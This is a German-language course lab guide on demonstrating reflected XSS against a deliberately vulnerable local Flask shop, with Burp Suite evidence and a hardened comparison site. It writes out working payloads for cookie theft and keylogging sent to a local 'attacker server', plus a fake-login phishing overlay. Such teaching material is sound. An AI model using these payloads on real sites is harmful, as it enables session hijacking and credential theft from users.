# XSS Demonstration - Step-by-Step Anleitung

**NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**

Diese Anleitung zeigt, wie du Reflected XSS Angriffe demonstrierst und mit Burp Suite nachweist.

---

## Projektstruktur

```
XSS_Projekt/
├── unsecurepage/           # Verwundbare Website
│   ├── server.py           # Flask Server (65 Zeilen)
│   ├── templates/          # HTML Templates
│   │   ├── index.html      # Hauptseite mit 8 Produkten
│   │   ├── cart.html       # Warenkorb mit 3 Demo-Artikeln
│   │   └── contact.html    # Kontaktseite
│   └── static/             # CSS & JavaScript
│       ├── style.css
│       └── script_minimal.js
├── securepage/             # Geschützte Website
│   ├── server_secure.py    # Flask mit Escape & CSP (43 Zeilen)
│   └── templates/
│       └── index.html
├── attacker-server/        # Cookie-Diebstahl Server
│   └── AttServ.js          # Node.js Server
└── payloads.md             # XSS Payload Sammlung
```

---

## Teil 1: Projekt Setup

### 1.1 Python Dependencies installieren

```bash
cd d:\Studium\Semester_3\cybersec\XSS_Projekt
pip install -r requirements.txt
```

**requirements.txt Inhalt:**
```
Flask==3.0.0
Werkzeug==3.0.1
```

### 1.2 Node.js Dependencies installieren (für Attacker Server)

```bash
cd attacker-server
npm install
```

---

## Teil 2: Server starten

### 2.1 Verwundbare Website starten (unsecurepage)

```bash
cd unsecurepage
python server.py
```

**Server läuft auf:** http://localhost:5000

**XSS-Vektoren:**
- Search: `/?search=<payload>`
- Promo: `/?promo=<payload>`
- Error: `/?error=<payload>`
- Filter: `/?filter=<payload>`
- Review: `/?reviewer=<name>&review=<payload>`
- Contact: `/contact?name=<name>&subject=<subject>&message=<payload>`
- Voucher: `/cart?voucher=<payload>`

### 2.2 Geschützte Website starten (securepage) - Optional

```bash
cd securepage
python server_secure.py
```

**Server läuft auf:** http://localhost:6000

**Schutzmaßnahmen:**
- Input Escaping mit Flask's `escape()`
- Content Security Policy (CSP) Headers
- Alle Eingaben werden escaped angezeigt

### 2.3 Attacker Server starten (für Cookie-Diebstahl)

```bash
cd attacker-server
node AttServ.js
```

**Server läuft auf:** http://localhost:3000

**Dashboard:** http://localhost:3000/dashboard

**Funktionen:**
- Cookie-Diebstahl Endpoint: `/steal?c=...`
- Keylogger Endpoint: `/keys?d=...`
- Live Dashboard mit Auto-Refresh
- Terminal Logs

---

## Teil 3: XSS Angriffe testen (OHNE Burp Suite)

### 3.1 Einfacher Alert-Test

**Im Browser öffnen:**
```
http://localhost:5000/?search=<img src=x onerror="alert('XSS')">
```

**Was passiert:**
- XSS Payload wird in der Suche reflektiert
- Alert-Box erscheint mit "XSS"

### 3.2 Cookie-Anzeige

**Im Browser öffnen:**
```
http://localhost:5000/?search=<img src=x onerror="alert(document.cookie)">
```

**Was passiert:**
- Alert-Box zeigt alle Cookies an
- Demo-Cookies: sessionId, authToken, userName, userEmail

### 3.3 Cookie-Diebstahl mit Attacker Server

**Schritt 1:** Stelle sicher, dass Attacker Server läuft (http://localhost:3000)

**Schritt 2:** Im Browser öffnen:
```
http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

**Was passiert:**
1. XSS Payload wird ausgeführt
2. Cookies werden an Attacker Server gesendet
3. Im Terminal von AttServ.js erscheinen die Cookies:
   ```
   [COOKIE STOLEN] sessionId=abc123; authToken=xyz789; userName=Max; userEmail=max@example.com
   ```
4. Dashboard zeigt die Daten: http://localhost:3000/dashboard

### 3.4 Phishing-Angriff

**Im Browser öffnen:**
```
http://localhost:5000/?error=<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px\"><h2>Session abgelaufen</h2><form><input type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0\"><input type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0\"><button style=\"width:100%;background:#000;color:white;padding:12px\">Einloggen</button></form></div>'">
```

**Was passiert:**
- Komplette Seite wird ersetzt durch Fake-Login
- Sieht aus wie echte Login-Seite
- Könnte Credentials stehlen (wenn mit Server kombiniert)

### 3.5 Warenkorb-Gutschein Test

**Im Browser:**
1. Gehe zu http://localhost:5000/cart
2. Im Gutscheincode-Feld eingeben:
   ```html
   <img src=x onerror="alert('XSS im Warenkorb!')">
   ```
3. "Einlösen" klicken
4. Alert erscheint

---

## Teil 4: XSS mit Burp Suite nachweisen

### 4.1 Burp Suite Setup

**Schritt 1:** Burp Suite starten

**Schritt 2:** Proxy konfigurieren
- Burp Suite: Proxy → Options
- Interface: 127.0.0.1:8080 (Standard)

**Schritt 3:** Browser Proxy einstellen
- Firefox: Settings → Network Settings → Manual proxy
- HTTP Proxy: 127.0.0.1
- Port: 8080
- "Also use this proxy for HTTPS" aktivieren

**Schritt 4:** Burp CA Zertifikat installieren (falls HTTPS)
- Im Browser: http://burpsuite
- "CA Certificate" downloaden
- In Firefox importieren: Settings → Certificates → Import

**Schritt 5:** Intercept aktivieren
- Burp Suite: Proxy → Intercept → "Intercept is on"

### 4.2 Reflected XSS in HTTP Response nachweisen

**Schritt 1:** Im Browser öffnen (mit aktiviertem Burp Proxy):
```
http://localhost:5000/?search=<img src=x onerror="alert('XSS')">
```

**Schritt 2:** In Burp Suite:
- Proxy → HTTP history
- Finde den GET Request zu `/?search=...`
- Klicke auf die Response

**Schritt 3:** Im Response Tab siehst du:
```html
<div style="background: #e8f4f8; padding: 15px; margin: 20px 0; border-left: 4px solid #2196F3;">
    <strong>Suchergebnisse für:</strong> <img src=x onerror="alert('XSS')">
</div>
```

**WICHTIG:** Der XSS-Payload ist **DIREKT in der HTTP Response** sichtbar!
- Das ist der Beweis für **Reflected XSS** (server-seitig)
- Nicht DOM-based XSS (client-seitig)

### 4.3 Burp Scanner verwenden (Professional Version)

**Schritt 1:** Rechtsklick auf Request in HTTP history

**Schritt 2:** "Do active scan"

**Schritt 3:** Scanner findet automatisch:
- Reflected XSS in search Parameter
- Reflected XSS in promo Parameter
- Reflected XSS in error Parameter
- Reflected XSS in filter Parameter
- Reflected XSS in review Parameter
- Reflected XSS in voucher Parameter
- Reflected XSS in contact message Parameter

**Schritt 4:** Scanner Report ansehen:
- Target → Site map
- Issues gefunden mit Severity "High"

### 4.4 Burp Repeater verwenden

**Schritt 1:** Finde einen Request in HTTP history

**Schritt 2:** Rechtsklick → "Send to Repeater"

**Schritt 3:** Im Repeater Tab:
- Ändere den Parameter:
  ```
  GET /?search=TEST123 HTTP/1.1
  ```
- Klicke "Send"
- Im Response siehst du: `Suchergebnisse für: TEST123`

**Schritt 4:** Teste XSS Payloads:
```
GET /?search=<script>alert(1)</script> HTTP/1.1
```
```
GET /?search=<img src=x onerror=alert(1)> HTTP/1.1
```
```
GET /?search=<svg onload=alert(1)> HTTP/1.1
```

**Schritt 5:** Analysiere Response:
- Payload ist direkt in HTML reflektiert
- Kein Escaping vorhanden
- XSS bestätigt

### 4.5 Burp Intruder für automatische Tests

**Schritt 1:** Request zu Intruder senden
- Rechtsklick → "Send to Intruder"

**Schritt 2:** Positions setzen:
```
GET /?search=§PAYLOAD§ HTTP/1.1
```

**Schritt 3:** Payloads laden:
- Intruder → Payloads Tab
- Payload type: Simple list
- Füge Payloads hinzu:
  ```
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <input autofocus onfocus=alert(1)>
  <details open ontoggle=alert(1)>
  <iframe src=javascript:alert(1)>
  ```

**Schritt 4:** Attack starten:
- "Start attack" klicken
- Jeder Payload wird automatisch getestet
- Responses analysieren

**Schritt 5:** Erfolgreiche Payloads identifizieren:
- Filter: Length > 5000 (typische Größe mit XSS)
- Manuell Response überprüfen
- Payload ist im HTML vorhanden

### 4.6 Cookie-Diebstahl mit Burp nachweisen

**Schritt 1:** Attacker Server starten (localhost:3000)

**Schritt 2:** Mit Burp Proxy aktiviert im Browser öffnen:
```
http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

**Schritt 3:** In Burp HTTP history siehst du:
1. **Request zu localhost:5000** mit XSS Payload
2. **Response von localhost:5000** mit reflektiertem Payload
3. **Request zu localhost:3000/steal** mit gestohlenen Cookies!

**Schritt 4:** Analysiere den /steal Request:
```
GET /steal?c=sessionId%3Dabc123%3B%20authToken%3Dxyz789 HTTP/1.1
Host: localhost:3000
```

**Das beweist:**
- XSS wurde erfolgreich ausgeführt
- Cookies wurden an Attacker Server gesendet
- Kompletter Angriffs-Flow sichtbar in Burp

### 4.7 Vergleich: Geschützte vs. Ungeschützte Seite

**Schritt 1:** Teste ungeschützte Seite (localhost:5000):
```
http://localhost:5000/?search=<img src=x onerror=alert(1)>
```
- In Burp Response: Payload ist unverändert im HTML
- XSS funktioniert

**Schritt 2:** Teste geschützte Seite (localhost:6000):
```
http://localhost:6000/?search=<img src=x onerror=alert(1)>
```
- In Burp Response: Payload ist escaped:
  ```html
  &lt;img src=x onerror=alert(1)&gt;
  ```
- XSS funktioniert NICHT
- CSP Header vorhanden: `Content-Security-Policy: default-src 'self'; ...`

---

## Teil 5: Alle 7 XSS-Vektoren testen

### Vector 1: Search (Suchfeld)

**URL:**
```
http://localhost:5000/?search=<img src=x onerror="alert('Search XSS')">
```

**Burp Beweis:**
- Response zeigt: `<strong>Suchergebnisse für:</strong> <img src=x onerror="alert('Search XSS')">`

### Vector 2: Promo (Promo-Parameter)

**URL:**
```
http://localhost:5000/?promo=<img src=x onerror="alert('Promo XSS')">
```

**Burp Beweis:**
- Response zeigt Promo-Banner mit injiziertem Payload

### Vector 3: Error (Fehler-Parameter)

**URL:**
```
http://localhost:5000/?error=<img src=x onerror="alert('Error XSS')">
```

**Burp Beweis:**
- Response zeigt Fehler-Box mit Payload

### Vector 4: Filter (Filter-Parameter)

**URL:**
```
http://localhost:5000/?filter=<img src=x onerror="alert('Filter XSS')">
```

**Burp Beweis:**
- Response zeigt Filter-Info mit Payload

### Vector 5: Review (Bewertung)

**URL:**
```
http://localhost:5000/?reviewer=Hacker&review=<img src=x onerror="alert('Review XSS')">
```

**Burp Beweis:**
- Response zeigt Bewertung mit Namen und Payload im Review-Text

### Vector 6: Contact (Kontaktformular)

**URL:**
```
http://localhost:5000/contact?name=Test&subject=Test&message=<img src=x onerror="alert('Contact XSS')">
```

**Burp Beweis:**
- Response zeigt Bestätigung mit Payload in der Nachricht

### Vector 7: Voucher (Gutscheincode im Warenkorb)

**URL:**
```
http://localhost:5000/cart?voucher=<img src=x onerror="alert('Voucher XSS')">
```

**Burp Beweis:**
- Response zeigt Gutschein-Bestätigung mit Payload

---

## Teil 6: Screenshots für Dokumentation

### 6.1 Was du screenshotten solltest:

1. **Burp HTTP History**
   - Request mit XSS Payload
   - Response mit reflektiertem Payload
   - Zeigt Reflected XSS

2. **Burp Repeater**
   - Request Tab mit Payload
   - Response Tab mit HTML
   - Payload im HTML sichtbar

3. **Burp Scanner Results** (Professional)
   - Liste der gefundenen XSS Issues
   - Severity: High
   - Alle 7 Vektoren gefunden

4. **Browser mit Alert**
   - XSS Alert-Box
   - URL mit Payload sichtbar

5. **Attacker Dashboard**
   - http://localhost:3000/dashboard
   - Gestohlene Cookies angezeigt
   - Timestamp und Details

6. **Geschützte Seite**
   - localhost:6000 mit escaped Payload
   - Zeigt, dass Escaping funktioniert

7. **Burp Response Vergleich**
   - Ungeschützt: Raw Payload im HTML
   - Geschützt: Escaped Payload im HTML

---

## Teil 7: Wichtige Payloads für Burp Tests

### Basis Payloads (immer funktionieren)

```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<input autofocus onfocus="alert(1)">
<details open ontoggle="alert(1)">
```

### Cookie-Diebstahl Payloads

```html
<img src=x onerror="alert(document.cookie)">
<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
```

### Phishing Payloads

```html
<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white\"><h2>Login</h2><form><input placeholder=\"Email\"><input type=\"password\" placeholder=\"Passwort\"><button>Einloggen</button></form></div>'">
```

### Keylogger Payload

```html
<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k));k=''}}">
```

---

## Teil 8: Troubleshooting

### Problem: XSS funktioniert nicht im Browser

**Lösung:**
- Browser hat XSS Filter aktiviert
- Meta-Tag in HTML prüfen: `<meta http-equiv="X-XSS-Protection" content="0">`
- Chrome XSS Auditor ist deprecated, sollte kein Problem sein

### Problem: Burp zeigt keine Requests

**Lösung:**
- Proxy richtig konfiguriert? (127.0.0.1:8080)
- Intercept ist auf "on"?
- Browser verwendet Proxy?

### Problem: Cookie-Diebstahl funktioniert nicht

**Lösung:**
- Attacker Server läuft? (node AttServ.js)
- URL korrekt? (http://localhost:3000/steal)
- CORS Problem? (sollte lokal kein Problem sein)

### Problem: Flask Server startet nicht

**Lösung:**
```bash
pip install Flask==3.0.0 Werkzeug==3.0.1
```
- Port 5000 bereits belegt? Ändere in server.py: `app.run(port=5001)`

### Problem: Burp CA Zertifikat fehlt

**Lösung:**
- http://burpsuite öffnen (mit Burp Proxy aktiv)
- "CA Certificate" downloaden
- In Browser importieren

---

## Teil 9: Präsentation / Demonstration

### Empfohlener Ablauf für Live-Demo:

**1. Einleitung (2 Min)**
- Was ist Reflected XSS?
- Unterschied zu DOM-based XSS
- Warum ist es gefährlich?

**2. Projekt Setup zeigen (3 Min)**
- Projektstruktur erklären
- Server starten (unsecurepage, attacker-server)
- Seite im Browser zeigen

**3. Einfacher XSS Test (5 Min)**
- Alert Payload im Browser
- Cookie-Anzeige
- Zeigen, dass es funktioniert

**4. Burp Suite Demo (10 Min)**
- Burp Setup zeigen
- HTTP Request/Response mit Payload
- Payload in Response nachweisen
- Repeater verwenden
- Scanner Results zeigen (wenn Professional)

**5. Cookie-Diebstahl (5 Min)**
- Attacker Server Dashboard zeigen
- XSS Payload mit fetch()
- Gestohlene Cookies im Dashboard
- Burp zeigt /steal Request

**6. Alle Vektoren zeigen (5 Min)**
- Schnell durch alle 7 Vektoren
- Unterschiedliche Injection Points
- Warenkorb-Gutschein als praktisches Beispiel

**7. Schutzmaßnahmen (5 Min)**
- Geschützte Seite zeigen (localhost:6000)
- Input Escaping Demo
- CSP Header in Burp
- Vergleich: escaped vs. unescaped

**8. Fazit (2 Min)**
- XSS ist kritisch
- Immer Input validieren/escapen
- CSP als Defense-in-Depth
- Burp Suite als Pentest-Tool

---

## Teil 10: Cheat Sheet

### Server URLs
- Unsecure: http://localhost:5000
- Secure: http://localhost:6000
- Attacker: http://localhost:3000
- Dashboard: http://localhost:3000/dashboard

### Quick Payloads
```html
Simple:     <img src=x onerror=alert(1)>
Cookies:    <img src=x onerror=alert(document.cookie)>
Steal:      <img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### Burp Workflow
1. Proxy aktivieren (127.0.0.1:8080)
2. Browser Proxy einstellen
3. Intercept ON
4. Request senden
5. HTTP History → Response prüfen
6. Payload im HTML = Reflected XSS ✓

### Alle XSS Vektoren
```
/?search=<payload>
/?promo=<payload>
/?error=<payload>
/?filter=<payload>
/?reviewer=X&review=<payload>
/contact?name=X&subject=X&message=<payload>
/cart?voucher=<payload>
```

---

**WICHTIG:** Dieses Projekt ist ausschließlich für Bildungszwecke in kontrollierten Umgebungen!
